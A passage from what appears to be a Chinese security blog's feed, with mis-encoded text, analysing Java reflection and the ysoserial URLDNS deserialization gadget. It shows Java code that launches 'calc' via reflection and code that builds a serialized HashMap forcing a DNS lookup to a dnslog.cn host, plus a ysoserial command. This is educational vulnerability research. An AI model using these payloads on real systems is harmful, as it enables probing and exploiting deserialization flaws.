å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">            </span><br><span class="line">            String[][] cls2 = <span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc"</span>&#125;&#125;;</span><br><span class="line">            Object ob = cls.getConstructor(String[]<span class="class">.<span class="keyword">class</span>).<span class="title">newInstance</span>(<span class="title">cls2</span>)</span>;</span><br><span class="line">            <span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">            cls.getMethod(<span class="string">"start"</span>).invoke(ob,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/7029#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029#toc-3</a><br><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a><br>JDKæ–‡æ¡£<br>Javaå®‰å…¨æ¼«è°ˆ-åå°„ç¯‡ â€“Pç‰›è‘—ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¦–å‘ï¼š&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaåå°„" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>å°æ¥¼æ˜¨å¤œåˆæ˜¥é£ï¼Œä½ çŸ¥ysoserial-Gadget-URLDNSå¤šå°‘ï¼Ÿ</title>
    <link href="https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/05/06/%E5%B0%8F%E6%A5%BC%E6%98%A8%E5%A4%9C%E5%8F%88%E6%98%A5%E9%A3%8E%EF%BC%8C%E4%BD%A0%E7%9F%A5ysoserial-Gadget-URLDNS%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-05-06T04:42:16.000Z</published>
    <updated>2020-05-06T07:17:45.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ–‡ç« é¦–å‘ï¼š<a href="https://www.sec-in.com/article/299" target="_blank" rel="noopener">https://www.sec-in.com/article/299</a><br>&emsp;&emsp;2015å¹´Gabriel Lawrence(@gebl)å’ŒChris Frohoff(@frohoff)åœ¨AppSecCaliå¤§ä¼šä¸Šæå‡ºçš„åˆ©ç”¨Apache Commons Collectionsæ¥æ„é€ å‘½ä»¤æ‰§è¡Œåˆ©ç”¨é“¾ï¼Œéšåå‘å¸ƒysoserialå·¥å…·ï¼Œä»æ­¤æ‰“å¼€Javaå®‰å…¨çš„è“æµ·ã€‚<br>&emsp;&emsp; åˆ©ç”¨é“¾(gadget chains)ï¼Œä¿—ç§°gadgetã€‚é€šä¿—æ¥è¯´å°±æ˜¯ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œå®ƒæ˜¯ä»è§¦å‘ä½ç½®å¼€å§‹åˆ°æ‰§è¡Œå‘½ä»¤çš„ä½ç½®ç»“æŸï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æ¼æ´éªŒè¯æ–¹æ³•(POC)ã€‚<br>&emsp;&emsp; ä½¿ç”¨æ–¹æ³•ï¼ŒGitHubä¸‹è½½jaråŒ…æˆ–è€…gitæºç è‡ªå·±ç¼–è¯‘ã€‚</p><blockquote><p>java -jar ysoseial.jar URLDNS â€œ<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a></p></blockquote><p>å†å°†ç”Ÿæˆå·POCå‘é€ç›®æ ‡ï¼Œå¦‚æœç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¹¶ä¸”æ»¡è¶³åˆ©ç”¨é“¾æ¡ä»¶ï¼Œåˆ™å‘½ä»¤å°†ä¼šè¢«æ‰§è¡Œã€‚</p><p>ps: æœ¬æ–‡å®éªŒä»£ç éƒ½ä¸Šä¼ <a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>é¡¹ç›®ï¼Œä¸ºäº†è®©æ›´å¤šäººçŸ¥é“ï¼Œéº»çƒ¦åŠ¨åŠ¨å°æ‰‹starä¸€ä¸‹ã€‚</p><hr><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p> &emsp;&emsp; <code>URLDNS</code>æ˜¯å…¶ä¸­çš„ä¸€ä¸ªgadgetçš„åå­—ï¼Œæ­¤gadgetä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸ç”¨æ¥éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚URLDNS gadgetååˆ†é€‚åˆç”¨æ¥éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><ul><li>æ­¤gadgetå®Œå…¨ä½¿ç”¨Javaå†…ç½®çš„ç±»æ„é€ ï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“æ”¯æŒã€‚</li><li>å¦‚æœç›®æ ‡æ²¡æœ‰å›æ˜¾ï¼Œé€šè¿‡DNSè§£æè¯·æ±‚æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</li></ul><hr><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ‰“å¼€<code>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</code>æŸ¥çœ‹æºç ï¼Œä½†ç¬”è€…è¿™é‡Œä½¿ç”¨è‡ªå·±æ”¹å†™çš„æºç æ¥åˆ†ææ­¤gadgeté“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> samny.serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> samny.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        HashMap hm = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="keyword">null</span>,<span class="string">"http://4h9yq1.dnslog.cn"</span>,handler);</span><br><span class="line">        hm.put(url,url);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(url,<span class="string">"hashCode"</span>,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"url"</span>));</span><br><span class="line">        oos.writeObject(hm);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"url"</span>));</span><br><span class="line"><span class="comment">// æ³¨é‡Šè¿™è¡Œä»£ç æ˜¯ä¸ä¼šäº§ç”Ÿdnsè§£æè¯·æ±‚ï¼Œ</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>&emsp;&emsp; æ¼æ´åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹æ¼æ´æ‰§è¡Œæ•ˆæœã€‚<br>&emsp;&emsp; åˆ†æä¸€ä¸ªåœ¨çº¿dnsè§£æè®°å½•ç½‘ç«™<a href="http://www.dnslog.cn" target="_blank" rel="noopener">DNSlog Platform</a>ï¼Œç½‘ç«™æ— éœ€ä»»ä½•ç™»å½•æ³¨å†Œï¼Œå›½å†…è®¿é—®é€Ÿåº¦ä¹Ÿå¿«ï¼ŒDNSè®°å½•è·å–é€Ÿåº¦æ²¡å¾—è¯´ï¼Œå­åŸŸåå¯ä»¥æ— é™æ›´æ¢ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427153912402.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æ¼æ´å¤ç°æ­¥éª¤</strong></p><ol><li>ä¿®æ”¹ä½ èƒ½è¿‡è®°å½•dnsè§£æçš„ç½‘å€ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427154428787.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>ç›´æ¥è¿è¡Œmainæ–¹æ³•ï¼Œåˆ·æ–°è®°å½•ã€‚</li></ol><h2 id="æ–­ç‚¹åˆ†æ"><a href="#æ–­ç‚¹åˆ†æ" class="headerlink" title="æ–­ç‚¹åˆ†æ"></a>æ–­ç‚¹åˆ†æ</h2><p>&emsp;&emsp; è§¦å‘ååºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•æ˜¯<code>readObject</code>ï¼Œæ‰€ä»¥ç¬”è€…åœ¨43è¡Œä»£ç å¤„å’Œ<code>hashmap</code>çš„<code>readObject</code>å„è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚<br>PS:</p><ul><li>ä»¥å…dnsè®°å½•æ··æ·†ï¼Œå»ºè®®æ¯æ¬¡åˆ†æéƒ½æ¢ä¸€ä¸ªåŸŸåã€‚</li><li>æ­¤å¤„ä¼šæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘ä»¬åˆ°åº•æ€ä¹ˆåœ¨JDKåŒ…ä¸­æ‰¾åˆ°HashMapè¿™ä¸ªç±»çš„readobjectå‡½æ•°å‘¢ï¼Ÿå› ä¸ºJDKçš„ç±»è¶…çº§å¤šï¼Œéš¾é“æˆ‘ä»¬å¿…é¡»è¦ä¸€ä¸ªä¸ªç¿»æ‰¾ï¼Ÿ</li><li>å…¶å®æœç´¢æ˜¯å¯ä»¥æœç´¢å¯¼å…¥åŒ…çš„å†…å®¹çš„ï¼Œ<code>Ctrl+Shift+F</code> åœ¨<code>Scope - All Places</code>æœç´¢<code>class hashmap</code>å³å¯ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427155537417.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æ–­ç‚¹è®¾ç½®å¥½äº†ï¼Œå¼€å§‹åˆ†æï¼Œç¬”è€…è¿™é‡Œç›´æ¥ä»HashMap.javaçš„<code>readObject</code>å¼€å§‹åˆ†æã€‚<br>hashmapä¸­readObjectä¼šè°ƒç”¨putValæ–¹æ³•æ˜¯å¾€HashMapä¸­æ”¾å…¥é”®å€¼å¯¹çš„æ–¹æ³•ï¼Œè¿›è€Œä¼šè®¡ç®—hashcodeå€¼ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427155709722.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æ¥ç€ä¼šåˆ¤æ–­keyæ˜¯å¦ä¸ºç©ºï¼ŒhashCodeæ˜¯å¦ä¸ç­‰äº-1ï¼Œä¸ç­‰äº-1ä¼šç›´æ¥è¿”å›ï¼Œç­‰äº-1ä¼šé‡æ–°è®¡ç®—ã€‚è¿™æ—¶å€™æˆ‘ä»¬çœ‹ç¬”è€…å†™æºç 36è¡Œï¼Œä¿®æ”¹æ–¹æ³•hashCodeçš„å€¼ä¸º-1ï¼Œè¿™æ—¶ä½ æ˜¯å¦æ˜ç™½æ­¤æ—¶çš„ç”¨æ„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427160955616.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200427161035866.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200427161223686.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><p>&emsp;&emsp; è®¡ç®—<code>hash</code>çš„æ—¶å€™ä¼šè·³è½¬åˆ°<code>java.net.URLStreamHandler.java#hashCode</code>æ–¹æ³•æ¥è®¡ç®—hashã€‚æ³¨æ„çœ‹å›¾ç‰‡ä¸­è¢«æ¡†ä½çš„ä¸€è¡Œä»£ç ï¼ŒhashCodeåœ¨è®¡ç®—hashæ—¶ï¼Œä¼šè°ƒç”¨<code>getHostAddress()</code>æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨<code>getByName(host)</code>æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427161513369.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; æ‰§è¡Œæ–¹æ³•ï¼Œæˆ‘ä»¬å‘ç°ä¼šæœ‰ä¸€ä¸ªç­‰å¾…æ—¶é—´å¤§æ¦‚2ç§’é’Ÿä¹‹å(å…¶å®å°±æ˜¯DNSè§£ææ‰€éœ€è¦çš„æ—¶é—´)ï¼Œå¯ä»¥è·å–DNSè§£æè®°å½•ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427162302103.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20200427162013698.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2020042716232791.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200427162708718.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>&emsp;&emsp; æ•´ä¸ªçš„<code>URLDNS</code>çš„gadgetå…¶å®æ¸…æ™°åˆç®€å•ã€‚</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>&emsp;&emsp; å…¶å®ä½œè€…åœ¨åšå®¢ä¸­å†™é“ï¼Œå¯ä»¥ç”¨å››è¡Œä»£ç å°±å¯ä»¥å®ç°æ­¤gadget chainsï¼Œåè§‚ysoserialä¸­æºç ï¼Œå»æ‰æ³¨é‡Šä¹Ÿå¤šè¿˜æœ‰å‡ è¡Œä»£ç ï¼Œ<code>å¤šå‡ºçš„ä»£ç æ—¶å¹²å˜›çš„å‘¢ï¼Ÿ</code></p><p><img src="https://img-blog.csdnimg.cn/20200427164430117.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å·§å¦™é¿å…é‡å¤"><a href="#å·§å¦™é¿å…é‡å¤" class="headerlink" title="å·§å¦™é¿å…é‡å¤"></a>å·§å¦™é¿å…é‡å¤</h2><p>&emsp;&emsp; å¤šå‡ºå‡ è¡Œä»£ç ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ã€‚ysoserialçš„ä½œè€…é‡å†™äº†URLStreamHandlerå…¶ä¸­ä¸¤ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜æ²¡ææ¸…æ¥šå…¶ä¸­çš„ä½œç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; è€è§„çŸ©ï¼Œæ–­ç‚¹æ’¸ç ã€‚ä¸è¿‡æ­¤æ—¶æ–­ç‚¹åº”è¯¥è®¾ç½®åœ¨å“ªï¼Ÿç¬”è€…æŒ‰ç…§æºä½œè€…çš„ä»£ç ï¼Œå»æ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚å‰©ä¸‹ä»£ç ä¹Ÿå°±ä¸Šé¢çš„å’Œä¸‹é¢å›¾ç‰‡ç»™å‡ºçš„5è¡Œä»£ç ï¼Œåˆ†æä¸éš¾å‘ç°æ–­ç‚¹åº”è¯¥è®¾ç½®åœ¨<code>hm.put()</code>ã€‚å…¶ä¸­31å’Œ32è¡Œä»£ç è‚¯å®šæ˜¯ä¸ä¼šå»è®¾ç½®æ–­ç‚¹çš„ï¼Œè‡³äº36è¡Œåœ¨ä¹‹å‰å°±è¯´æ˜å…¶ä½œç”¨ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427171425793.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; è°ƒè¯•ä»£ç ä¸èƒ½å‘ç°ï¼Œputæ–¹æ³•ä¹Ÿå’Œhashmapä¸­çš„readObjectæ–¹æ³•çš„æ–¹æ³•æ˜¯å·®ä¸å¤šçš„ï¼Œç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427171917233.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; ç»§ç»­è·Ÿè¿›è¿˜æ˜¯æ¥åˆ°<code>java.net.URLStreamHandler#hashCode</code>æ–¹æ³•ï¼Œä½†æ­¤æ—¶æ–¹æ³•ä¼šè·³è½¬åˆ°ç¬”è€…å¤å†™çš„æ–¹æ³•ä¸­ï¼Œè¿”å›åº”è¯¥<code>null</code>ï¼Œè¿›è€Œå°±ä¸ä¼šå»è§£ædnsã€‚<br><img src="https://img-blog.csdnimg.cn/20200427172155144.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200427172348537.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><p>&emsp;&emsp; ä¸ºä»€ä¹ˆhashmapä¸­putvalæ–¹æ³•å°±ä¸ä¼šè·³è½¬åˆ°æˆ‘ä»¬å¤ç°çš„ç±»æ–¹æ³•é‡Œé¢è¿”å›ä¸€ä¸ªnullå‘¢ï¼Ÿï¼ˆä¸ªäººè§è§£ï¼Œæºç æ— æ³•ä¿®æ”¹æ‰€ä»¥æ— æ³•è°ƒè¯•ï¼‰<br>ç­”ï¼šååºåˆ—åŒ–æ—¶åº”è¯¥æ—¶å°†äºŒè¿›åˆ¶ä»£ç ç›´æ¥è¯»å–ï¼Œè¿›å»è°ƒç”¨hashmapä¸­readObjectæ–¹æ³•ï¼Œæ­¤æ—¶ååºåˆ—åŒ–å®Œå…¨æ˜¯ä½¿ç”¨jdkæºç è°ƒç”¨ï¼Œä¸ä¼šå†å»çœ‹æˆ‘ä»¬ç”¨æˆ·å¤å†™æ–¹æ³•ã€‚<br>&emsp;&emsp; ç¬”è€…è¿™é‡Œæœ‰ç‚¹äº‹å®å¯ä»¥æ•´æ˜æˆ‘çš„è§‚ç‚¹ã€‚<br>ä¼—æ‰€å‘¨çŸ¥Javaæ˜¯ä»£ç æ˜¯ä¸€è¡Œä¸€è¡Œçš„å»ç¼–è¯‘è§£é‡Šçš„ï¼Œæˆ‘ä»¬å¤ç°çš„ç±»URLStreamHandlerï¼Œå®ç°çš„ç±»å¯¹è±¡handeråœ¨urlè¿›å®ä¾‹åŒ–çš„æ—¶å€™å¤„ç†äº†ï¼Œä¹Ÿå°±æ˜¯33è¡Œä»£ç ã€‚ä½†æ˜¯è¿›è¡Œååºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å°†æ­¤å¤ç°æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ï¼Œæ‰€ä»¥ååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šå¤„ç†URLï¼Œè®¡ç®—hashå€¼çš„æ—¶å€™ï¼Œä¸å¯èƒ½è·³è½¬åˆ°æˆ‘ä»¬å¤å†™çš„æ–¹æ³•è¿”å›ä¸€ä¸ªnullï¼Œåªèƒ½æ˜¯è·³è½¬åˆ°åŸæœ¬çš„æ–¹æ³•ä¸­ã€‚<br><img src="https://img-blog.csdnimg.cn/20200427174533677.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; å½“URLæœ€åˆè¢«æ”¾åœ¨HashMapä¸­æ—¶ï¼Œé€šè¿‡å¯ä»¥è°ƒç”¨putï¼ŒHashMap.hashMap.hashæ–¹æ³•è¢«è°ƒç”¨ã€‚è¿™ä¸ªæ–¹æ³•åè¿‡æ¥åˆä¼šè°ƒç”¨è¯¥URLçš„hashCodeï¼Œä½†æ˜¯hashCodeæ˜¯æœ‰ä¸€ä¸ªç¼“å­˜å€¼çš„ï¼Œå¹¶ä¸ä¼šè§¦å‘DNSè§£æã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è¯»å–æ•°æ®æµçš„æ—¶å€™ï¼Œåœ¨URLæ·»åŠ åˆ°HashMapä¸­é‡ç½®ç¼“å­˜å€¼(ä½¿å…¶hashCode=-1)ï¼Œæ¥ç¡®ä¿DNSè§£æã€‚å¯ä»¥ä½¿ç”¨Javaçš„Reflectionä¸­setFieldValueæ–¹æ³•æ¥è¾¾åˆ°é‡ç½®hashCodeå€¼ä¸º-1ã€‚<br>&emsp;&emsp; Ysoserialç”¨ä¸€ä¸ªç±»å¤å†™å®Œç¾é¿å…é‡å¤DNSLOGï¼Œæ„Ÿæ¦‚å…¶ä½œè€…çš„ç¥å¥‡é€»è¾‘æ€ç»´èƒ½åŠ›ã€‚æœ‰å…´è¶£çš„æœ‹å‹å®Œå…¨å¯ä»¥å»æ³¨é‡Šæ‰<code>getHostAddress</code>æ–¹æ³•äº¦æˆ–è€…æ˜¯åˆ é™¤æ‰æ•´ä¸ªhandlerä»£ç ï¼Œç„¶åå°±ä¼šå‡ºç°DNSLOGã€‚</p><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>Pç¥Javaå®‰å…¨æ¼«è°ˆ - 08.ååºåˆ—åŒ–ç¯‡(2)<br><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank" rel="noopener">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a><br><a href="https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/" target="_blank" rel="noopener">https://lalajun.github.io/2020/03/05/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ysoserial-URLDNS/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ–‡ç« é¦–å‘ï¼š&lt;a href=&quot;https://www.sec-in.com/article/299&quot; target=&quot;_blank&quot; rel=
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ysoserial-Gadget" scheme="https://summersec.github.io/tags/ysoserial-Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Skipped breakpoint because it happened inside debugger evaluation</title>
    <link href="https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/"/>
    <id>https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/</id>
    <published>2020-05-05T04:42:16.000Z</published>
    <updated>2020-05-06T07:21:37.897Z</updated>
    
